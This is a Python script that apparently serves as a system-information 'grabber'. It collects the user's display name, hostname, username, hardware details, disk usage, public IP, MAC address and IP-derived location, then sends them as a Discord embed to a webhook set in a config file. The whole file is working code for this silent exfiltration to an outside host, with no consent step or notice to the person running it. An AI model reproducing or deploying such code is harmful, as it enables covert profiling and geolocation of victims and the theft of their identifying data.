# Import necessary modules and configuration
from config import *
from discord_webhook import DiscordWebhook, DiscordEmbed
from profil_picture import set_webhook_avatar_from_url
import geo
import user_info
import disk_info
import system_info

# Set the webhook URL to the default value from the configuration
webhook_url = DEFAULT_WEBHOOK

# Set the URL of the image to be used as the webhook avatar
image_url = "https://cdn.discordapp.com/avatars/648508571734245376/a_04f5199ee21d38b6aac9cd7381675efe.jpeg"
set_webhook_avatar_from_url(webhook_url, image_url)

# Set default color, title, description, and username from configuration
color = DEFAULT_COLOR
title = WEBHOOK_TITLE
description = WEBHOOK_DESCRIPTION
username = USERNAME

# Get a list of all disk partitions
partitions = disk_info.get_all_partitions()

# Create a DiscordWebhook instance
webhook = DiscordWebhook(
    url=webhook_url, content="", username=username, rate_limit_retry=True
)

# Define user information using f-strings
user_field_value = f"""```
Display Name: {user_info.get_display_name()} 
Hostname: {user_info.get_hostname()} 
Username: {user_info.get_username()}
```"""

# Assume that system_info.get_gpus_info() returns a list of GPUs
gpus = system_info.get_gpus_info()
gpu_list_string = "\n".join(gpus)  # Join GPUs into separate lines

# Define system information using f-strings
system_field_value = f"""```
CPU: {system_info.get_cpu_info()} 
GPU: {gpu_list_string}
RAM: {system_info.get_ram_info():.1f} GB
```"""

# Create a DiscordEmbed instance with title, description, and color
embed = DiscordEmbed(title=title, description=description, color=color)

# Add user and system information as embed fields
embed.add_embed_field(
    name=":bust_in_silhouette: User", value=user_field_value, inline=False
)
embed.add_embed_field(name=":desktop: System", value=system_field_value, inline=False)

# Iterate over disk partitions and add their information as embed fields
for partition in partitions:
    try:
        usage = disk_info.get_disk_usage(partition.mountpoint)
        value = f"```Total Size: {disk_info.convert_bytes(disk_info.get_total_size(usage))}\nUsed: {disk_info.convert_bytes(disk_info.get_used_space(usage))}\nFree: {disk_info.convert_bytes(disk_info.get_free_space(usage))}\nPercentage Used: {disk_info.get_percent_used(usage)}%```"
        embed.add_embed_field(
            name=f":floppy_disk: Disk: {partition.device}", value=value, inline=False
        )
    except Exception:
        pass

# Add network information as an embed field
embed.add_embed_field(
    name=":satellite: Network Information",
    value=f"```IP Address: {geo.get_own_ip()} \nMAC Address: {geo.get_mac()}\nCountry: {geo.get_country()} \nRegion: {geo.get_region()} \nCity: {geo.get_city()} ({geo.get_zip()}) \nISP: {geo.get_isp()}```",
    inline=False,
)

# Add the embed to the webhook
webhook.add_embed(embed=embed)

# Define a function to send the webhook
def send_webhook():
    response = webhook.execute()
